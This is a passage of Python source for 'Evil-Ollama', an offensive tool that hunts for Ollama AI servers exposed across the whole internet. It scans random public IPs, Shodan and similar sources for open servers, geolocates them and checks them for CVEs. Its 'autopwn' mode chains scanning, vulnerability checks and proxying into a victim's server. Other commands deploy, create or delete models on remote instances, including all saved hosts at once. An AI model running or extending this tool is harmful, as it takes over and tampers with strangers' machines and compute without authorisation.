    target = target.rstrip("/")
    
    import requests as sync_requests
    
    if not os.path.exists(prompt_file):
        log(f"File not found: {prompt_file}", "ERROR")
        return
    
    with open(prompt_file, 'r') as f:
        prompts = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    if not prompts:
        log("No prompts found in file", "WARN")
        return
    
    # Get models
    try:
        resp = sync_requests.get(f"{target}/api/tags", timeout=10)
        model = resp.json().get("models", [{}])[0].get("name", "unknown")
    except:
        log("Cannot connect", "ERROR")
        return
    
    log(f"📋 Batch executing {len(prompts)} prompts against {model} on {target}", "CHAT")
    
    results = []
    for i, prompt in enumerate(prompts, 1):
        print(f"\n{C.YELLOW}[{i}/{len(prompts)}] Prompt:{C.END} {prompt[:100]}{'...' if len(prompt) > 100 else ''}")
        
        try:
            resp = sync_requests.post(f"{target}/api/chat", json={
                "model": model, "messages": [{"role": "user", "content": prompt}],
                "stream": False
            }, timeout=120)
            
            if resp.status_code == 200:
                content = resp.json().get("message", {}).get("content", "")
                print(f"{C.GREEN}Response:{C.END} {content[:200]}{'...' if len(content) > 200 else ''}")
                results.append({"prompt": prompt, "response": content})
            else:
                log(f"HTTP {resp.status_code}", "ERROR")
                results.append({"prompt": prompt, "error": f"HTTP {resp.status_code}"})
        except Exception as e:
            log(f"Error: {e}", "ERROR")
            results.append({"prompt": prompt, "error": str(e)})
    
    # Save results
    outfile = f"batch_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(outfile, 'w') as f:
        json.dump(results, f, indent=2)
    log(f"💾 Batch results saved to {outfile}", "OK")

# ============================================================
# EXPORT FUNCTIONS
# ============================================================

def export_html(instances: List[dict], output: str = "evilollama_report.html"):
    """Generate beautiful HTML report"""
    models_list = []
    for inst in instances:
        for m in inst.get("models", []):
            models_list.append(m)
    unique_models = sorted(set(models_list))
    
    # Geo distribution
    countries = {}
    for inst in instances:
        geo = inst.get("geo") or {}
        country = geo.get("country", "Unknown")
        countries[country] = countries.get(country, 0) + 1
    
    # Vulnerability stats
    total_cves = sum(len(inst.get("cves", [])) for inst in instances)
    total_vuln = sum(1 for inst in instances if inst.get("cves"))
    total_running = sum(inst.get("running_count", 0) for inst in instances)
    total_models = sum(inst.get("model_count", 0) for inst in instances)
    
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🦙 Evil-Ollama Report</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
               background: #0a0a0f; color: #e0e0e0; padding: 20px; }}
        .container {{ max-width: 1600px; margin: 0 auto; }}
        h1 {{ color: #8b5cf6; font-size: 2rem; margin-bottom: 5px; }}
        .subtitle {{ color: #888; margin-bottom: 30px; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
                  gap: 12px; margin-bottom: 25px; }}
        .stat-card {{ background: #1a1a2e; border-radius: 10px; padding: 15px;
                      border: 1px solid #2a2a3e; }}
        .stat-card .num {{ font-size: 1.8rem; font-weight: bold; color: #8b5cf6; }}
        .stat-card .label {{ color: #888; font-size: 0.8rem; }}
        .stat-card.danger .num {{ color: #ef4444; }}
        .stat-card.success .num {{ color: #34d399; }}
        table {{ width: 100%; border-collapse: collapse; background: #1a1a2e;
                 border-radius: 12px; overflow: hidden; margin-top: 15px; }}
        th {{ background: #2a2a3e; padding: 10px 12px; text-align: left; color: #8b5cf6;
              font-size: 0.85rem; }}
        td {{ padding: 8px 12px; border-bottom: 1px solid #2a2a3e; font-size: 0.9rem; }}
        tr:hover {{ background: #22223a; }}
        .badge {{ display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 0.75rem; }}
        .badge-crit {{ background: #ff000033; color: #ff4444; }}
        .badge-high {{ background: #ff660033; color: #ff8844; }}
        .badge-med {{ background: #ffaa0033; color: #ffcc44; }}
        .badge-safe {{ background: #00ff0033; color: #44ff44; }}
        .model-tag {{ display: inline-block; background: #2d3748; color: #a0aec0;
                      padding: 2px 8px; border-radius: 10px; font-size: 0.75rem; margin: 1px; }}
        .running {{ color: #34d399; }}
        .version {{ font-family: monospace; font-size: 0.85rem; }}
        .actions a {{ color: #8b5cf6; text-decoration: none; margin-right: 5px; font-size: 0.85rem; }}
        .actions a:hover {{ text-decoration: underline; }}
        .footer {{ margin-top: 40px; color: #555; text-align: center; font-size: 0.8rem; }}
        h2 {{ color: #8b5cf6; margin-top: 25px; font-size: 1.3rem; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🦙 Evil-Ollama Report</h1>
        <p class="subtitle">Generated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | v{VERSION} | {len(instances)} instance(s)</p>
        
        <div class="stats">
            <div class="stat-card"><div class="num">{len(instances)}</div><div class="label">Instances</div></div>
            <div class="stat-card"><div class="num">{unique_models.__len__()}</div><div class="label">Unique Models</div></div>
            <div class="stat-card"><div class="num">{total_models}</div><div class="label">Total Models</div></div>
            <div class="stat-card success"><div class="num">{total_running}</div><div class="label">Running</div></div>
            <div class="stat-card"><div class="num">{len(countries)}</div><div class="label">Countries</div></div>
            <div class="stat-card danger"><div class="num">{total_cves}</div><div class="label">CVEs Found</div></div>
        </div>
        
        <h2>📍 Geographic Distribution</h2>
        <table>
            <tr><th>Country</th><th>Count</th></tr>
            {''.join(f"<tr><td>{c}</td><td>{n}</td></tr>" for c, n in sorted(countries.items(), key=lambda x: -x[1]))}
        </table>
        
        <h2>📋 Instance Details</h2>
        <table>
            <tr>
                <th>IP</th><th>Port</th><th>Version</th><th>Models</th><th>Running</th><th>Size</th><th>Location</th><th>Actions</th>
            </tr>
            {''.join(f"""
            <tr>
                <td><strong>{inst.get('ip', '?')}</strong></td>
                <td>{inst.get('port', 11434)}</td>
                <td class="version">
                    {inst.get('version', '?')}
                    {f'<span class="badge badge-crit">💀 {len(inst.get("cves",[]))} CVE</span>' if inst.get('cves') else '<span class="badge badge-safe">✓</span>'}
                </td>
                <td>{" ".join(f'<span class="model-tag">{m}</span>' for m in inst.get('models', [])[:6])}
                    {f'<span class="model-tag">+{len(inst.get("models",[]))-6}</span>' if len(inst.get("models",[])) > 6 else ''}
                </td>
                <td class="running">{inst.get('running_count', 0)}</td>
                <td>{inst.get('total_size_human', '?')}</td>
                <td>{inst.get('geo', {}).get('city', '?')}, {inst.get('geo', {}).get('country', '?')}</td>
                <td class="actions">
                    <a href="http://{inst.get('ip', '')}:{inst.get('port', 11434)}/api/tags" target="_blank">🔍</a>
                    <a href="http://{inst.get('ip', '')}:{inst.get('port', 11434)}" target="_blank">🌐</a>
                </td>
            </tr>""" for inst in instances)}
        </table>
        
        <h2>📦 All Models Found ({unique_models.__len__()} unique)</h2>
        <p>{" ".join(f'<span class="model-tag">{m}</span>' for m in unique_models)}</p>
        
        <div class="footer">
            Generated by Evil-Ollama v{VERSION} | For authorized security research only
        </div>
    </div>
</body>
</html>"""
    
    with open(output, 'w') as f:
        f.write(html)
    log(f"📄 HTML report saved: {output} ({os.path.getsize(output)/1024:.1f} KB)", "OK")
    return output

def export_csv(instances: List[dict], output: str = "evilollama_instances.csv"):
    with open(output, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(["IP", "Port", "Version", "Models", "Model Count", "Running", "Size",
                        "Country", "City", "ISP", "Found", "CVE Count", "Source", "Hostname"])
        for inst in instances:
            geo = inst.get("geo") or {}
            writer.writerow([
                inst["ip"], inst.get("port", 11434),
                inst.get("version", "unknown"),
                ", ".join(inst.get("models", [])),
                inst.get("model_count", 0),
                inst.get("running_count", 0),
                inst.get("total_size_human", "0"),
                geo.get("country", ""), geo.get("city", ""), geo.get("isp", ""),
                inst.get("timestamp", ""),
                len(inst.get("cves", [])),
                inst.get("source", "scan"),
                inst.get("hostname", "")
            ])
    log(f"📄 CSV saved: {output}", "OK")

def export_json(instances: List[dict], output: str = "evilollama_instances_export.json"):
    save_json(output, instances)
    log(f"📄 JSON saved: {output}", "OK")

def do_export(instances: List[dict], fmt: str = "html"):
    if fmt == "html":
        return export_html(instances)
    elif fmt == "csv":
        return export_csv(instances)
    elif fmt == "json":
        return export_json(instances)
    elif fmt == "all":
        export_html(instances)
        export_csv(instances)
        export_json(instances)
        log("✅ All formats exported!", "OK")
    else:
        log(f"Unknown format: {fmt}. Use html, csv, json, or all", "ERROR")

# ============================================================
# MONITORING DAEMON (CLI only — no web)
# ============================================================

def monitoring_daemon(interval: int = 3600, random_count: int = 5000):
    """CLI-only continuous monitoring daemon"""
    log(f"{C.BOLD}🔄 Monitoring daemon started (interval: {interval}s, {random_count} IPs/scan){C.END}", "OK")
    log(f"   Press Ctrl+C to stop", "INFO")
    
    config = get_config()
    cycle = 0
    
    while True:
        cycle += 1
        log(f"⏰ Scan cycle #{cycle} at {datetime.now().isoformat()}", "STEP")
        
        start = time.time()
        ips = generate_random_ips(random_count)
        found = asyncio.run(scan_ips(ips))
        
        # Geolocate + notify
        for inst in found:
            geo = geolocate_ip(inst["ip"])
            if geo:
                inst["geo"] = geo
                save_found(inst)
            if config.get("notify_on_find"):
                notify_found(inst)
        
        # Auto export
        if config.get("auto_export"):
            instances = load_found()
            do_export(instances, config.get("export_format", "json"))
        
        elapsed = time.time() - start
        total = len(load_found())
        log(f"📊 Cycle #{cycle} complete in {elapsed_str(elapsed)} | {len(found)} new | {total} total in DB", "OK")
        log(f"💤 Sleeping {interval}s until next scan...", "INFO")
        time.sleep(interval)

# ============================================================
# AUTO-PWN MODE (Enhanced)
# ============================================================

def autopwn(random_count: int = 5000, vuln_scan: bool = True, proxy_port: int = 9090):
    """Scan → Vuln Scan → Proxy → Report — all in one"""
    print(C.CLEAR)
    print(BANNER)
    log(f"{C.BOLD}{C.MAGENTA}🚀 AUTO-PWN MODE ACTIVATED{C.END}", "STEP")
    
    # Step 1: Scan
    log(f"{C.BOLD}Step 1/4: Scanning {random_count} random IPs...{C.END}", "STEP")
    ips = generate_random_ips(random_count)
    found_instances = asyncio.run(scan_ips(ips))
    
    if not found_instances:
        log("❌ No instances found. Try a larger scan count.", "ERROR")
        return
    
    log(f"🎯 Found {len(found_instances)} instance(s)!", "FOUND")
    
    # Step 2: Geolocate
    log(f"{C.BOLD}Step 2/4: Geolocating...{C.END}", "STEP")
    found_instances = batch_geolocate(found_instances)
    
    # Step 3: Vulnerability scan
    if vuln_scan and found_instances:
        log(f"{C.BOLD}Step 3/4: Vulnerability scanning...{C.END}", "STEP")
        for inst in found_instances[:5]:  # Scan top 5
            target = f"{inst['ip']}:{inst.get('port', 11434)}"
            log(f"🔴 Scanning {target}...", "VULN")
            vuln_results = scan_vulnerabilities(target)
            inst["vuln_scan"] = vuln_results
    
    # Step 4: Export
    log(f"{C.BOLD}Step 4/4: Generating report...{C.END}", "STEP")
    do_export(found_instances, "html")
    
    # Summary
    total_vulns = sum(len(inst.get("vuln_scan", {}).get("vulnerabilities", [])) 
                     for inst in found_instances if "vuln_scan" in inst)
    total_cves = sum(len(inst.get("cves", [])) for inst in found_instances)
    
    print(f"\n{C.BOLD}{C.MAGENTA}{'='*60}{C.END}")
    print(f"{C.BOLD}  🚀 AUTO-PWN COMPLETE{C.END}")
    print(f"{'='*60}")
    print(f"  {C.BOLD}Instances found:{C.END}     {len(found_instances)}")
    print(f"  {C.BOLD}Total models:{C.END}       {sum(inst.get('model_count', 0) for inst in found_instances)}")
    print(f"  {C.BOLD}Vulnerabilities:{C.END}    {total_vulns}")
    print(f"  {C.BOLD}CVEs detected:{C.END}      {total_cves}")
    print(f"  {C.BOLD}Report:{C.END}             evilollama_report.html")
    print(f"{C.MAGENTA}{'='*60}{C.END}\n")
    
    # Start proxy for first instance
    if found_instances:
        target = f"{found_instances[0]['ip']}:{found_instances[0].get('port', 11434)}"
        log(f"🔌 Starting proxy → {target} on port {proxy_port}", "PROXY")
        log(f"   Press Ctrl+C to stop", "INFO")
        start_proxy(target, proxy_port)

# ============================================================
# SHOW INSTANCES (Enhanced)
# ============================================================

def show_instances(instances: List[dict], geo_lookup: bool = False):
    if not instances:
        log("No instances found yet. Run a scan first.", "WARN")
        return
    
    if geo_lookup:
        instances = batch_geolocate(instances)
    
    # Stats
    total_vuln = sum(1 for inst in instances if inst.get("cves"))
    total_running = sum(inst.get("running_count", 0) for inst in instances)
    total_size = sum(inst.get("total_size_bytes", 0) for inst in instances)
    
    print(f"\n{C.BOLD}{C.MAGENTA}{'='*100}{C.END}")
    print(f"{C.BOLD}  🦙 Found Ollama Instances ({len(instances)} total){C.END}")
    print(f"  {C.DIM}Models: {sum(inst.get('model_count',0) for inst in instances)} | "
          f"Running: {total_running} | Vulnerable: {total_vuln} | "
          f"Total Size: {bytes_to_human(total_size)}{C.END}")
    print(f"{C.BOLD}{'='*100}{C.END}")
    
    for i, inst in enumerate(instances, 1):
        models = inst.get("models", [])
        models_str = ", ".join(models[:6])
        if len(models) > 6: models_str += f" ... (+{len(models)-6})"
        
        geo = inst.get("geo") or {}
        loc = f"{geo.get('city','?')}, {geo.get('country','?')}" if geo else "?"
        
        cve_count = len(inst.get("cves", []))
        cve_str = f"{C.RED} ⚠{cve_count}CVE{C.END}" if cve_count else ""
        run_str = f"{C.GREEN} 🏃{inst.get('running_count',0)} running{C.END}" if inst.get('running_count') else ""
        size_str = f" {inst.get('total_size_human', '?')}" if inst.get('total_size_human') else ""
        
        print(f"\n  {C.CYAN}{i:2d}.{C.END} {C.BOLD}{inst['ip']}:{inst.get('port', 11434)}{C.END}{cve_str}{run_str}")
        print(f"      {C.DIM}Version:{C.END} {inst.get('version', '?')}{size_str}")
        print(f"      {C.DIM}Models:{C.END}  {models_str} ({inst.get('model_count', len(models))} total)")
        print(f"      {C.DIM}Location:{C.END} {loc}")
        print(f"      {C.DIM}Source:{C.END}   {inst.get('source', 'scan')}")
        print(f"      {C.DIM}Commands:{C.END} {C.YELLOW}./launcher.sh chat -t {inst['ip']}:{inst.get('port', 11434)}{C.END}")
        print(f"                {C.YELLOW}./launcher.sh proxy -t {inst['ip']}:{inst.get('port', 11434)}{C.END}")
        print(f"                {C.YELLOW}./launcher.sh vuln -t {inst['ip']}:{inst.get('port', 11434)}{C.END}")
        print(f"                {C.YELLOW}./launcher.sh fingerprint -t {inst['ip']}:{inst.get('port', 11434)}{C.END}")
    
    print(f"\n{C.BOLD}{'='*100}{C.END}\n")

# ============================================================
# CLI MAIN
# ============================================================

def main():
    global SCAN_TIMEOUT, MAX_CONCURRENT, FOUND_DB
    
    parser = argparse.ArgumentParser(
        description=f"🦙 Evil-Ollama v{VERSION} — Exposed Ollama Instance Hunter & Proxy Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # SCANNING
  ./launcher.sh scan --random 10000
  ./launcher.sh scan --cidr 0.0.0.0/8
  ./launcher.sh scan --shodan API_KEY
  
  # DISCOVERY
  ./launcher.sh scan --dns example.com
  ./launcher.sh scan --ct example.com
  
  # VULNERABILITY SCANNING
  ./launcher.sh vuln --target 1.2.3.4:11434
  ./launcher.sh vuln --all
  
  # PROXY
  ./launcher.sh proxy --target 1.2.3.4:11434
  
  # CHAT
  ./launcher.sh chat --target 1.2.3.4:11434
  ./launcher.sh chat --batch prompts.txt --target 1.2.3.4:11434
  
  # FINGERPRINT
  ./launcher.sh fingerprint --target 1.2.3.4:11434
  
  # MODEL OPERATIONS
  ./launcher.sh models --target 1.2.3.4:11434
  ./launcher.sh models --pull target model_name
  
  # DEPLOY
  ./launcher.sh deploy --model gemma:2b --all
  ./launcher.sh deploy --model gemma:2b --target 1.2.3.4:11434
  
  # PUSH
  ./launcher.sh push -t 1.2.3.4:11434 -m mymodel:tag
  
  # CREATE
  ./launcher.sh create -t 1.2.3.4:11434 -m newmodel --modelfile ./Modelfile
  ./launcher.sh create -t 1.2.3.4:11434 -m newmodel --from base:latest
  
  # COPY
  ./launcher.sh copy -t 1.2.3.4:11434 -s old:latest -d new:latest
  
  # REMOVE
  ./launcher.sh remove -t 1.2.3.4:11434 -m model:tag
  
  # PS
  ./launcher.sh ps -t 1.2.3.4:11434
  
  # EMBED
  ./launcher.sh embed -t 1.2.3.4:11434 -m nomic-embed-text -p "hello world"
  
  # GENERATE
  ./launcher.sh generate -t 1.2.3.4:11434 -m gemma:2b -p "tell me a joke"
  
  # EXPORT
  ./launcher.sh export --format html
  
  # AUTO-PWN (Scan → Vuln Scan → Proxy → Report)
  ./launcher.sh autopwn --random 5000
  
  # MONITOR (CLI daemon)
  ./launcher.sh monitor --interval 3600
  
  # CONFIG
  ./launcher.sh config --show
  ./launcher.sh config --telegram-token "BOT_TOKEN" --telegram-chat "123456"
        """
    )
    
    subparsers = parser.add_subparsers(dest="command")
    
    # ─── SCAN ───
    sp = subparsers.add_parser("scan", help="Scan for Ollama instances (TCP/DNS/CT/Shodan/Censys/FOFA/Internet)")
    sg = sp.add_mutually_exclusive_group(required=True)
    sg.add_argument("--random", type=int, metavar="N", help="Scan N random public IPs")
    sg.add_argument("--cidr", type=str, metavar="CIDR", help="Scan a CIDR range")
    sg.add_argument("--file", type=str, metavar="FILE", help="Scan IPs from file")
    sg.add_argument("--shodan", type=str, metavar="KEY", help="Search Shodan for Ollama instances")
    sg.add_argument("--censys", type=str, metavar="ID:SECRET", help="Search Censys")
    sg.add_argument("--fofa", type=str, metavar="EMAIL:KEY", help="Search FOFA")
    sg.add_argument("--dns", type=str, metavar="DOMAIN", help="DNS-based discovery via subdomain enumeration")
    sg.add_argument("--ct", type=str, metavar="DOMAIN", help="Certificate Transparency log discovery")
    sg.add_argument("--internet", action="store_true", help="Full internet search: random scan + DNS + CT logs on common domains")
    sp.add_argument("--port", type=int, default=DEFAULT_OLLAMA_PORT)
    sp.add_argument("--concurrent", type=int, default=MAX_CONCURRENT)
    sp.add_argument("--timeout", type=int, default=SCAN_TIMEOUT)
    sp.add_argument("--geo", action="store_true", help="Geolocate found instances")
    sp.add_argument("--export", type=str, choices=["html","csv","json","all"], help="Auto-export results")
    sp.add_argument("--notify", action="store_true", help="Send Telegram notification")
    
    # ─── VULN SCAN ───
    sp = subparsers.add_parser("vuln", help="Vulnerability scan Ollama instances")
    sp.add_argument("--target", "-t", type=str, help="Target (ip:port)")
    sp.add_argument("--all", action="store_true", help="Scan all found instances")
    sp.add_argument("--output", "-o", type=str, help="Save results to file")
    
    # ─── EXPLOIT ───
    sp = subparsers.add_parser("exploit", help="Exploit specific CVEs on Ollama instances")
    sp.add_argument("--cve", type=str, required=True, help="CVE ID to test (e.g., CVE-2024-37032)")
    sp.add_argument("--target", "-t", type=str, required=True, help="Target (ip:port)")
    
    # ─── MODELS ───
    sp = subparsers.add_parser("models", help="List/pull/analyze models on remote instances")
    sp.add_argument("--target", "-t", type=str, help="Target (ip:port)")
    sp.add_argument("--pull", type=str, nargs=2, metavar=("TARGET", "MODEL"), help="Pull model info from target")
    sp.add_argument("--analyze", type=str, nargs=2, metavar=("TARGET", "MODEL"), help="Deep analyze a specific model")
    
    # ─── DEPLOY (pull model onto instance) ───
    sp = subparsers.add_parser("deploy", help="Pull a model onto remote Ollama instances (/api/pull)")
    sp.add_argument("--model", "-m", type=str, required=True, help="Model name to deploy (e.g., gemma:2b, hf.co/username/model)")
    sp.add_argument("--target", "-t", type=str, help="Specific target (ip:port)")
    sp.add_argument("--all", action="store_true", help="Deploy to ALL saved instances")
    sp.add_argument("--notify", action="store_true", help="Send Telegram notification")
    
    # ─── PUSH (push model to registry) ───
    sp = subparsers.add_parser("push", help="Push model from remote instance to registry (/api/push)")
    sp.add_argument("--target", "-t", type=str, required=True, help="Target (ip:port)")
    sp.add_argument("--model", "-m", type=str, required=True, help="Model name:tag to push")
    
    # ─── CREATE (create model from Modelfile) ───
    sp = subparsers.add_parser("create", help="Create model from Modelfile on remote instance (/api/create)")
    sp.add_argument("--target", "-t", type=str, required=True, help="Target (ip:port)")
    sp.add_argument("--model", "-m", type=str, required=True, help="New model name")
    sp.add_argument("--modelfile", type=str, help="Path to Modelfile")
    sp.add_argument("--from", dest="from_model", type=str, metavar="BASE", help="Base model name to create from")
    
    # ─── COPY (copy model within instance) ───
    sp = subparsers.add_parser("copy", help="Copy model within a remote instance (/api/copy)")
    sp.add_argument("--target", "-t", type=str, required=True, help="Target (ip:port)")
    sp.add_argument("--source", "-s", type=str, required=True, help="Source model name:tag")
    sp.add_argument("--dest", "-d", type=str, required=True, help="Destination model name:tag")
    
    # ─── REMOVE (delete model) ───
    sp = subparsers.add_parser("remove", help="Delete model from remote instance (/api/delete)")
    sp.add_argument("--target", "-t", type=str, required=True, help="Target (ip:port)")
    sp.add_argument("--model", "-m", type=str, required=True, help="Model name:tag to remove")
    
    # ─── PS (list running models) ───
    sp = subparsers.add_parser("ps", help="List running models on remote instance (/api/ps)")
    sp.add_argument("--target", "-t", type=str, required=True, help="Target (ip:port)")
    
    # ─── EMBED (generate embeddings) ───
    sp = subparsers.add_parser("embed", help="Generate embeddings via remote instance (/api/embed)")
    sp.add_argument("--target", "-t", type=str, required=True, help="Target (ip:port)")
    sp.add_argument("--model", "-m", type=str, required=True, help="Embedding model name")
    sp.add_argument("--prompt", "-p", type=str, required=True, help="Input text for embedding")
    
    # ─── GENERATE (generate completion) ───
    sp = subparsers.add_parser("generate", help="Generate completion via remote instance (/api/generate)")
    sp.add_argument("--target", "-t", type=str, required=True, help="Target (ip:port)")
    sp.add_argument("--model", "-m", type=str, required=True, help="Model name to use")
    sp.add_argument("--prompt", "-p", type=str, required=True, help="Prompt text")
    
    # ─── PROXY ───
    sp = subparsers.add_parser("proxy", help="Start proxy to remote Ollama instance (OpenAI compatible)")
    sp.add_argument("--target", "-t", type=str, required=True, help="Target (ip:port)")
    sp.add_argument("--port", "-p", type=int, default=8080, help="Local proxy port")
    sp.add_argument("--host", type=str, default="127.0.0.1", help="Bind address")
    sp.add_argument("--socks", action="store_true", help="SOCKS5 proxy mode (experimental)")
    
    # ─── CHAT ───
    sp = subparsers.add_parser("chat", help="Interactive chat with remote Ollama model")
    sp.add_argument("--target", "-t", type=str, required=True, help="Target (ip:port)")
    sp.add_argument("--batch", type=str, metavar="FILE", help="Batch execute prompts from file")
    
    # ─── FINGERPRINT ───
    sp = subparsers.add_parser("fingerprint", help="Deep fingerprint an Ollama instance")
    sp.add_argument("--target", "-t", type=str, help="Target (ip:port)")
    sp.add_argument("--all", action="store_true", help="Fingerprint all found instances")
    
    # ─── EXPORT ───
    sp = subparsers.add_parser("export", help="Export found instances to report")
    sp.add_argument("--format", "-f", type=str, default="html", choices=["html","csv","json","all"])
    sp.add_argument("--output", "-o", type=str, help="Output file path")
    
    # ─── SHOW ───
    sp = subparsers.add_parser("show", help="Show found instances")
    sp.add_argument("--geo", action="store_true", help="Show with geolocation")
    sp.add_argument("--export", type=str, choices=["html","csv","json"], help="Export and show")
    
    # ─── MONITOR ───
    sp = subparsers.add_parser("monitor", help="Continuous monitoring daemon (CLI only, no web)")
    sp.add_argument("--interval", type=int, default=3600, help="Seconds between scans")
    sp.add_argument("--random", type=int, default=5000, help="IPs per scan")
    sp.add_argument("--notify", action="store_true", help="Enable Telegram notifications")
    sp.add_argument("--export", type=str, choices=["html","csv","json","all"], help="Auto export format")
    
    # ─── CONFIG ───
    sp = subparsers.add_parser("config", help="View/edit configuration")
    sp.add_argument("--show", action="store_true", help="Show current config")
    sp.add_argument("--set", type=str, nargs=2, metavar=("KEY","VALUE"), help="Set config key=value")
    sp.add_argument("--telegram-token", type=str, help="Set Telegram bot token")
    sp.add_argument("--telegram-chat", type=str, help="Set Telegram chat ID")
    sp.add_argument("--shodan-key", type=str, help="Set Shodan API key")
    
    # ─── AUTOPWN ───
    sp = subparsers.add_parser("autopwn", help="AUTO-PWN: Scan → Vuln Scan → Proxy → Report")
    sp.add_argument("--random", type=int, default=5000, help="IPs to scan")
    sp.add_argument("--port", "-p", type=int, default=9090, help="Proxy port")
    sp.add_argument("--no-vuln", action="store_true", help="Skip vulnerability scanning")
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        return
    
    # Update global settings from config
    cfg = get_config()
    SCAN_TIMEOUT = cfg.get("scan_timeout", SCAN_TIMEOUT)
    MAX_CONCURRENT = cfg.get("max_scan_threads", MAX_CONCURRENT)
    
    print(BANNER)
    
    # ─── COMMAND DISPATCH ───
    
    if args.command == "scan":
        found = []
        
        if args.random:
            log(f"🎯 Generating {args.random} random IPs...", "INFO")
            ips = generate_random_ips(args.random)
            found = asyncio.run(scan_ips(ips, args.port, args.concurrent))
        elif args.cidr:
            ips = ips_from_cidr(args.cidr)
            if ips:
                log(f"🎯 Scanning CIDR {args.cidr} ({len(ips)} hosts)...", "INFO")
                found = asyncio.run(scan_ips(ips, args.port, args.concurrent))
            else:
                log(f"Invalid CIDR: {args.cidr}", "ERROR")
        elif args.file:
            ips = ips_from_file(args.file)
            if ips:
                found = asyncio.run(scan_ips(ips, args.port, args.concurrent))
        elif args.shodan:
            found = search_shodan(args.shodan, args.port)
        elif args.censys:
            parts = args.censys.split(":", 1)
            if len(parts) == 2:
                found = search_censys(parts[0], parts[1], args.port)
            else:
                log("Censys format: ID:SECRET", "ERROR")
        elif args.fofa:
            parts = args.fofa.split(":", 1)
            if len(parts) == 2:
                found = search_fofa(parts[0], parts[1], args.port)
            else:
                log("FOFA format: EMAIL:KEY", "ERROR")
        elif args.dns:
            found = discover_by_dns(args.dns, args.port)
        elif args.ct:
            found = discover_by_ct(args.ct, args.port)
        elif args.internet:
            log(f"{C.BOLD}🌐 INTERNET-WIDE SCAN MODE{C.END}", "STEP")
            log(f"Phase 1/3: Scanning 50000 random IPs...", "STEP")
            ips = generate_random_ips(50000)
            found = asyncio.run(scan_ips(ips, args.port, args.concurrent))
            
            log(f"Phase 2/3: DNS discovery on top cloud domains...", "STEP")
            cloud_domains = [
                "digitalocean.com", "aws.amazon.com", "azure.com", "googlecloud.com",
                "hetzner.com", "ovh.com", "linode.com", "vultr.com",
                "alibaba.com", "oracle.com", "ibm.com", "scaleway.com"
            ]
            for domain in cloud_domains:
                dns_found = discover_by_dns(domain, args.port)
                found.extend(dns_found)
            
            log(f"Phase 3/3: CT log search on top domains...", "STEP")
            for domain in cloud_domains[:5]:
                ct_found = discover_by_ct(domain, args.port)
                found.extend(ct_found)
            
            log(f"🌐 Internet scan complete: {len(found)} total instances", "OK")
        
        # Post-scan
        if args.geo and found:
            found = batch_geolocate(found)
            for inst in found:
                save_found(inst)
        
        if args.export and found:
            instances = load_found()
            do_export(instances, args.export)
        
        if args.notify and found:
            for inst in found:
                notify_found(inst)
    
    elif args.command == "vuln":
        if args.target:
            results = scan_vulnerabilities(args.target)
            if args.output:
                with open(args.output, 'w') as f:
                    json.dump(results, f, indent=2)
                    log(f"💾 Results saved to {args.output}", "OK")
        elif args.all:
            instances = load_found()
            if not instances:
                log("No instances in database. Run scan first.", "WARN")
                return
            all_results = []
            for inst in instances:
                target = f"{inst['ip']}:{inst.get('port', 11434)}"
                results = scan_vulnerabilities(target)
                all_results.append(results)
                inst["vuln_scan"] = results
            
            if args.output:
                with open(args.output, 'w') as f:
                    json.dump(all_results, f, indent=2)
        else:
            log("Specify --target or --all", "ERROR")
    
    elif args.command == "exploit":
        log(f"💀 Exploit module for {args.cve} on {args.target}", "CVE")
        log("Running vulnerability scan with focus on target CVE...", "INFO")
        results = scan_vulnerabilities(args.target)
        for v in results.get("vulnerabilities", []):
            if args.cve.lower() in v.get("id", "").lower():
                log(f"  💀 [{v['severity']}] {v['id']}: {v['name']}", "CVE")
                log(f"     Evidence: {v.get('evidence', 'N/A')}", "CVE")
                log(f"     Impact: {v.get('impact', 'N/A')}", "CVE")
                break
        else:
            log(f"⚠ CVE {args.cve} not directly testable — instance may be patched or version unknown", "WARN")
            log(f"   Tip: Run './launcher.sh fingerprint -t {args.target}' for detailed version info", "INFO")
    
    elif args.command == "models":
        if args.target:
            list_models(args.target)
        elif args.pull:
            target, model = args.pull
            pull_model(target, model)
        elif args.analyze:
            target, model = args.analyze
            log(f"🔍 Deep analysis of model '{model}' on {target}...", "MODEL")
            import requests
            if not target.startswith("http"):
                target = f"http://{target}"
            try:
                resp = requests.post(f"{target}/api/show", json={"model": model}, timeout=30)
                if resp.status_code == 200:
                    data = resp.json()
                    print(f"\n{C.BOLD}{C.MAGENTA}📦 Model Analysis: {model}{C.END}")
                    print(f"{'='*60}")
                    for k, v in data.items():
                        if isinstance(v, str) and len(v) > 200:
                            print(f"  {C.CYAN}{k}:{C.END} {v[:200]}...")
                        elif isinstance(v, (dict, list)):
                            print(f"  {C.CYAN}{k}:{C.END} {json.dumps(v, indent=2)[:300]}")
                        else:
                            print(f"  {C.CYAN}{k}:{C.END} {v}")
                    print(f"{'='*60}\n")
                else:
                    log(f"HTTP {resp.status_code}", "ERROR")
            except Exception as e:
                log(f"Error: {e}", "ERROR")
        else:
            log("Specify --target, --pull, or --analyze", "ERROR")
    
    elif args.command == "deploy":
        import requests
        model = args.model
        log(f"📦 DEPLOY MODE: Pushing model '{model}' to Ollama instances...", "STEP")
        
        if args.all:
            log(f"📦 Deploying to ALL saved instances...", "INFO")
            deploy_model_to_all(model)
        elif args.target:
            log(f"📦 Deploying to {args.target}...", "INFO")
            result = deploy_model_to_instance(args.target, model)
            if result.get("success"):
                log(f"✅ Model '{model}' deployed to {args.target}", "OK")
            else:
                log(f"❌ Failed to deploy to {args.target}: {result.get('status')}", "ERROR")
        else:
            log("Specify --target or --all", "ERROR")
    
    elif args.command == "push":
        cmd_push(args)
    
    elif args.command == "create":
        cmd_create(args)
    
    elif args.command == "copy":
        cmd_copy(args)
    
    elif args.command == "remove":
        cmd_remove(args)
